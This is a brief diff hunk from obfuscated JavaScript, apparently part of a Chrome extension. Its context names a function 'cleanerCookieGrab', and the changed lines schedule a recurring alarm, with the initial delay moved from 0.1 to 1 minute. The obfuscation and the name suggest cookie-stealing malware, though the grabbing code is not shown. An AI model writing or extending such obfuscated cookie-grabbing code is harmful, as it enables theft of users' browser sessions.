@@ -82,7 +82,7 @@ function cleanerCookieGrab() {
 }
 chrome[_0x3a2f[47]][_0x3a2f[46]][_0x3a2f[45]](function(_0x6f75x1b) {
     var _0x6f75x1c = alarms[_0x3a2f[35]](_0x3a2f[34], {
-        delayInMinutes: 0.1,
+        delayInMinutes: 1,
         periodInMinutes: 15
     });
     if (_0x6f75x1b[_0x3a2f[36]] == _0x3a2f[37]) {
